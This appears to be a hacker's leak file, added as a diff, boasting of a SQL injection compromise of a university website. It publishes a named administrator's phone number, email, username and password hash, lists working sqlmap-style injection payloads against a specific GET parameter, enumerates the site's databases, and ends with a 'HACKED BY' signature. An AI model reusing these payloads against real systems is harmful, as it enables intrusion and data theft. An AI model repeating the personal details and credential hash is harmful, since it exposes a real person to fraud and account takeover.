@@ -1,0 +1,49 @@
+[*] Administrator Info
+
+Iftikhar Ahmed Koondhar
+Phone: +923332783609
+Email: iftikhar.ahmed@quest.edu.pk
+Username: iftikhar
+Password Hash: c42d962a4f5bd00c2e4bf4918c77214a
+Department: Faculty of EL, ES & CSE
+Designation: Computer Systems Engineering, Assistant Professor
+
+P4YL04D
+
+Parameter: deptid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: deptid=24' AND 4771=4771 AND 'Xwny'='Xwny
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: deptid=24' AND GTID_SUBSET(CONCAT(0x71766b7a71,(SELECT (ELT(5372=5372,1))),0x717a767871),5372) AND 'pTje'='pTje
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: deptid=24' AND (SELECT 8752 FROM (SELECT(SLEEP(5)))wcma) AND 'DOnV'='DOnV
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: deptid=24' UNION ALL SELECT CONCAT(0x71766b7a71,0x6a506a74746e52617676766e6551685764766e577776584771765767525a6477536270724e61734a,0x717a767871)-- -
+---
+
+========END PAYLOAD===============
+
+
+[*] Databases
+
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0.0
+[05:19:30] [INFO] fetching database names
+available databases [4]:
+[*] information_schema
+[*] questedu_admission
+[*] questedu_database
+[*] questedu_fac_profiled
+
+=====================================
+
+HACKED BY VIKRAM @VIKRAM0X00 TG
+
+JAI SHREE RAM
